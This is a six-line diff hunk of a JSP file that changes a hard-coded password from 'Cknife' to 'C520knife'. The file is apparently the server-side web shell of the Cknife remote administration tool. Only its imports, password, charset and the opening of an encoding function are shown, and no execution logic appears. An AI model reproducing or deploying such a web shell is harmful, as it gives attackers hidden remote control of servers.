@@ -1,6 +1,6 @@
 <%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%>
 <%!
-	String Pwd = "Cknife";
+	String Pwd = "C520knife";
 	String cs = "UTF-8";
 	
 	String EC(String s) throws Exception {
